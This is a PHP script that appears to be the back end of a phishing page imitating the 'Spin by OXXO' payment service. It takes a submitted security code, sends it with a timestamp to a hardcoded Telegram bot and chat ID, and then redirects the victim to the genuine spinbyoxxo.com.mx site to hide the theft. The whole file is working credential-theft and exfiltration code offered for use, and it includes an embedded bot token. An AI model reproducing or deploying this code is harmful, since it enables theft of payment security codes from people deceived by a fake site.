<?php

error_reporting(0);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
date_default_timezone_set('America/Guatemala');

$token = "5376029455:AAFZaNBOQgw6D0GfBaCxOsjfJNd1HPZOtgA";
$cds = $_POST['cds'];
$horaActual = date("h:i:s");

$datos = [
    'chat_id' => '1189170037',
    #'chat_id' => '@el_canal si va dirigido a un canal',
'text' => "✅ SPIN BY OXXO ✅\n\n——————————————\n🔑Codigo de Seguridad: $cds\n—————————————— \n\n🕐: $horaActual",
    'parse_mode' => 'HTML' #formato del mensaje
];


$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot" . $token . "/sendMessage");
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, TRUE);
curl_setopt($ch, CURLOPT_POSTFIELDS, $datos);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

$r_array = json_decode(curl_exec($ch), true);

curl_close($ch);

if ($r_array['ok'] == 1) {
    header("Location: https://spinbyoxxo.com.mx/");
} else {
    echo "Mensaje no enviado.";
    print_r($r_array);
}

#if !empty($r_array) && array_key_exists("ok", $r_array);